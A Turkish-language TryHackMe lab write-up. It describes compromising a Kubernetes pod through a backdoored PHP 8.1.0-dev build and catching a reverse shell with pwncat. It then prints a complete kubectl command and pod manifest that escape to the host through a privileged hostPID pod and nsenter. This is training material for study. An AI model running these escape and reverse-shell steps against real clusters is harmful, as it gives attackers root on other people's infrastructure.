# Frank and Herby try again..... - THM Writeup
## Nmap Taraması
Açık port ve servisleri keşfetmek için nmap aracı kullanıyoruz. Tüm portlar da taranabilir ancak burada kubernetes için önemli olabilecek portlar tarandı. İlk tarama basit bir nmap taraması ve sadece 22 port açık olarak görünüyor.

![image](https://github.com/user-attachments/assets/326b2bf8-8ae5-4ce3-ad04-4a10fabacf64)

İkinci taramada kubernetes için kullanılan varsayılan portlar taranmaktadır.

![image](https://github.com/user-attachments/assets/b4b6f79c-224c-4b16-998a-4c895b9c3769)

30679 portunda bir PHP uygulamasının çalıştığı görülmektedir. 

![image](https://github.com/user-attachments/assets/b6534197-37a6-4bc0-9fb0-12677028f478)

## PHP 8.1.0-dev Remote Code Execution

PHP 8.1.0-dev exploit olarak araştırıldığında, exploit-db içerisinde bu versiyon ile ilgili uzaktan kod çalıştırmaya (RCE) yol açan bir zafiyetin exploit kodu yer almaktadır.

![image](https://github.com/user-attachments/assets/810c2bfd-d8eb-4a0c-a00d-2b0e6d14f8f3)

Bu exploit kodunun olduğu (flast101/php-8.1.0-dev-backdoor-rce)[https://github.com/flast101/php-8.1.0-dev-backdoor-rce] github reposuna bakalım. Burada reverse shell almak için de exploit kodu bulunuyor 

![Screenshot 2024-07-21 134244](https://github.com/user-attachments/assets/6bac4f8e-de7d-43e5-8759-ef321a6adaa0)

Bir pod içerisinde bulunduğunu `env | grep kubernetes` komutu ile ortam değişkenlerini kontrol ederek yapabiliriz. Diğer bir tespit metodu ise, /var/run/secrets/kubernetes.io/serviceaccount dizini altında seervis hesabına ait token, sertifika bilgileri gibi kimlik bilgileri yer almakta bu gibi kontroller yapılabilir.

![image](https://github.com/user-attachments/assets/7a892395-b19b-41bb-b00c-d3fb12ba2dff)
![image](https://github.com/user-attachments/assets/ef5b0afe-d70d-4c4e-8f64-d56c2916d346)


İçerisinde kubectl komutu bulunmuyor ve varsayılan olarak kullanılan birçok komut yok. netcat ile dinlemek biraz daha kısıtlı bir erişim veriyor bizim için. pwn-cat gibi daha kapsamlı kullanımı olan araçlar tercih edilebilir.

**Pwncat kullanarak reverse shell**

pwncat kurulumu, python ile sanal bir ortam oluşturup onun içerisinde gerçekleşmektedir. `pwncat-cs --listen -p 1337` komutu ile 1337 numaralı portu dinlemeye başlanır. Reverse shell exploit kodu çalışıtırıldıktan sonra bağlantı sağlanıyor. `upload kubectl /tmp/kubectl` komutunu kullanarak tmp dizini altına kubectl aracı yükleniyor.

![image](https://github.com/user-attachments/assets/f2205d0f-1f58-465e-b8c0-a3df7b617338)

`help` komutu ile diğer komutların daha detaylı kullanımı incelenebilir. `back` komutu çalıştırılarak hedef üzerindeki oturuma geri dönülür

![image](https://github.com/user-attachments/assets/8fcc79d5-9ad2-4c0f-a60b-86e7f01e2c0f)

## Kubernetes Enumeration

/tmp dizini altına gelip kubectl aracına çalıştırma izni verip kullanılabilir. `kubectl get pod` ile çalışan podlar görüntülenir. `--all-namespaces` parametresi tüm podları listelemektedir.

![image](https://github.com/user-attachments/assets/a70d363b-555a-4f06-9ce4-c08679859950)

`kubectl cluster-info dump` komutu ile kubernetes kümesi hakkında detaylı bilgilere ulaşılabilir.

![image](https://github.com/user-attachments/assets/dbbca957-43dc-4e37-880c-516c69d3ef92)

kubernetes ortamı için Microk8s dağıtımının 1.23.4 versiyonunun kullanıldığı görülmektedir. Burada ben manuel olarak kubernetes cluster hakkında bilgi toplamaya çalıştım. `kubectl auth can-i` komutu içinde bulunan kubernetes bağlamında izin verilen işlemleri listeler. Burada tüm kaynaklar için tüm işlemler yetkilendirilmektedir. Yüksek yetkilerin verilmesi güvenlik zafiyetlerine neden olmaktadır.

![image](https://github.com/user-attachments/assets/36032946-1414-4f7d-9408-02cd819e096c)

## Pod Escape To Host

`./kubectl run r00t --restart=Never -ti --rm --image lol  --overrides '{"spec":{"hostPID": true,"containers":[{"name":"1","image":"vulhub/php:8.1-backdoor","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'`

![image](https://github.com/user-attachments/assets/02850eff-89f7-426f-b1ee-1f068cbf3c64)

![image](https://github.com/user-attachments/assets/3dd8957c-988e-4142-8984-493f351e1288)

komutu ile hosta erişim sağlanıyor. Burada önemli bir nokta sistemde olmayan bir image pull edilemiyor ImagePullBackOff hatası veriyor pod oluştururken. Bu yüzden çalışan php-deploy podunun image kullanılması gerekiyor.
`kubectl get pod php-deploy-6d998f68b9-wlslz -o yaml` komutu ile pod yaml formatında görüntülenebiliyor.

![image](https://github.com/user-attachments/assets/7f7cf486-a134-4935-8af0-1f16e7d7da91)

Oluşturulmuş pod oluşumunda hangi image kullanılmış ise host makineye erişim için oluşturulan pod içinde de o image kullanılması gerekiyor.

![image](https://github.com/user-attachments/assets/510c4bb8-f01b-417a-ac72-36973f8b3425)

Benzer şekilde yaml dosyası ile de pod oluşturulabilir. 

![image](https://github.com/user-attachments/assets/585a9f32-2043-4f60-bc26-8640eebe0f7d)

yaml dosyası `upload escape-pod.yaml` komutu ile karşı tarafa gönderilebilir. Local oturuma gelmek için Ctrl+D kısayol tuşları kullanılır. Tekrar uzaktaki oturuma geçmek için `back` komutu çalıştırılır

![image](https://github.com/user-attachments/assets/e44e6f69-9515-4af1-b44a-fee11d74d093)

Sonraki adımda `kubectl apply -f escape-pod.yaml` komutu ile pod oluşturulur.

![image](https://github.com/user-attachments/assets/30042a35-ea38-4d26-98e2-11835474b74c)

`kubectl exec -it escape-to-host -- /bin/bash` komutu ile pod içerisine erişilir.

![image](https://github.com/user-attachments/assets/de2db445-7cc6-4ec0-92c5-c232908d2b9c)

Oluşan pod ayrıcalıklı (privileged) modda oluşturulur ve host processlerine erişimin olması için hostPID değeri true olarak set edilir. İçerisinde çalıştırılan nsenter komutu ile host mount namespace (ad alanı) erişimi sağlar.
Ek olarak bu teknik MITRE ATT&CK matrisinde Yetki Yükseltme (Privilege Escalation) taktik kategorisinde T1611 - Escape to Host tekniği olarak belirtilmektedir.

## Kaynaklar
- https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K04-policy-enforcement
- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes/pod-escape-privileges
- https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
